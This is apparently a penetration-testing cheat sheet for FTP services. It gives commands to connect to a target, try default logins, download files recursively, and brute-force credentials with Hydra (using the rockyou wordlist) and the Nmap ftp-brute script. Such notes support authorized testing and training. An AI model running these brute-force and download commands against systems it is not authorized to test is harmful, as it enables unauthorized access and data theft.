
```sh
ftp <target-ip> <target-port>
#Use try guest ,  anonymous  , admin , administrator
#to download files 
wget ftp://user:password@ftp.mydomain.com/path/file.ext  

#more advnaced ftp
lftp  <IP> 
lftp <user> <pass>


#download all files
wget -r --user="USERNAME" --password="PASSWORD" ftp://server.com/

```

>lftp is the enhanced version of ftp. It's easier to use than ftp.
```
lftp {IP}
```
#### Bruteforcing with Hydra
```sh
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-s port] ftp://X.X.X.X

#example
hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.68.46
```


#### Bruteforcing with Nmap

It is also possible to perform brute force on FTP with `Nmap` scripts:

```
nmap -p 21 --script ftp-brute X.X.X.X
```